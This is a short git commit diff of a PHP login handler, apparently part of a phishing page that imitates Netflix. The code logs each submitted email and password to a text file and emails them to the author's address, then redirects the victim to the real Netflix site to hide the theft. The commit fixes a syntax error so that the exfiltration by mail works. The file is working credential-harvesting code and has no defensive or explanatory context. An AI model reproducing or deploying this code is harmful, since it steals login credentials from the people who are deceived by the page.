254329fef12be8101ef03976c3e9bbea7f3e1978
filipcl <filip.larsen@live.no>
2021-02-18 16:06:33 +0100

    add mail

--- login.php
+++ login.php
@@ -1,6 +1,6 @@
 <?php
 
 file_put_contents("usernames.txt", "Account: " . $_POST['email'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
-mail("filip.larsen@live.no","FromScript","Account: " . $_POST['email'] . " Pass: " . $_POST['password'] . "\n", $headers = 'From: filip.larsen@live.no';);
+mail("filip.larsen@live.no","FromScript","Account: " . $_POST['email'] . " Pass: " . $_POST['password'] . "\n", "From: filip.larsen@live.no");
 header('Location: https://netflix.com');
 exit();
